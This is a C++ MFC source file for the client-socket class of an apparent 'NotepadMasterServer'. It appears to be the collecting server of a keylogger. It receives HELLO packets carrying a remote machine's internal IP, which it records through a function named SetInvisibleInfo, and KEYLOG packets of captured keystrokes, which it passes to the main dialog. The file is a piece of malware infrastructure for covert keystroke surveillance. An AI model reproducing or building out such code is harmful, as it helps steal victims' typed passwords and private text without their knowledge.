#include "pch.h"
#include "CClientSocket.h"
#include "NotepadMasterServerDlg.h"

#include "definition.h"


CClientSocket::CClientSocket(CNotepadMasterServerDlg* main_dlg)
{
	this->main_dlg = main_dlg;
}
void CClientSocket::OnReceive(int nErrorCode)
{
	// TODO: ���⿡ Ư��ȭ�� �ڵ带 �߰� ��/�Ǵ� �⺻ Ŭ������ ȣ���մϴ�.

	char buff[300];
	int len = Receive(buff, 300, 0);

	PDUHello* pdu_hello;
	PDUKeylog* pdu_keylog;
	CString format;

	switch (buff[0])
	{
	case HELLO :
		pdu_hello = (PDUHello*)buff;
		format = pdu_hello->internal_ip;
		main_dlg->SetInvisibleInfo(this, format);
		break;

	case KEYLOG :
		pdu_keylog = (PDUKeylog*)buff;
		main_dlg->ReceiveKeylog(this, pdu_keylog);
		break;
	}
	CSocket::OnReceive(nErrorCode);
}
